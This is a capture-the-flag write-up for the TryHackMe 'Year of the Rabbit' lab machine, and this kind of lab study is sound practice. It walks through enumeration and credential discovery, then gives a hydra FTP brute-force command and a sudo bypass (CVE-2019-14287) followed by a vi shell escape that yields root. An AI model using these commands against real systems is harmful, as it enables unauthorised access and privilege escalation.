# [Challenge](https://tryhackme.com/room/yearoftherabbit)

- # ENUM
	- ### nmap (`nmap -A -p- -T4 --min-rate=5000 rabbitYear `)
		- 21 -> ftp
		- 22 -> ssh
		- 80 -> http
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u rabbitYear -x .html,.txt,.php,.js`)
		- #### DIRECTORIES
			- `/assets`

- # EXPLOITATION
	- In `rabbityear/assets/style.css` there's an hidden file: `/sup3r_s3cr3t_fl4g.php` (and a rickroll)
		- It tells us to disable JS... let's do it
			- Nothing, just a rickroll...
		- Let's try using BurpSuite
		- Hidden directory found: `/WExYY2Cv-qU`"!
			- Let's analyze `Hot_Babe.png` with `strings`
				- We have the username and the passwords! Let's bruteforce with `hydra` (`hydra -l ftpuser -P pass.txt ftp://rabbitYear -t 64 -V -I`)
					- username: `ftpuser`
					- password: `5iez1wGXKfPKQ`
	- Let's connect into the FTP server and get `Eli's_Creds.txt`:
		- That's brainfuck language!
			- username: `eli`
			- password: `DSpDiM1wAEwid`
				- Let's log into SSH!
	- `"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"`
		- `find / -name s3cr3t 2>/dev/null` -> `/usr/games/s3cr3t`
			- We got Gwendoline's password!
				- pass: `MniVCQVhQHUNI`

- # PRIVILEGE ESCALATION
	- `sudo -l` -> `(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt`
		- We can't sudo as root :/
	- `CVE-2019-14287`: `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`
		- We can run `vi` as root thanks to this CVE (`-1 → UINT_MAX → error → fallback to root (UID 0)`)
			- In vim: `:!/bin/bash`
				- We're ROOT!
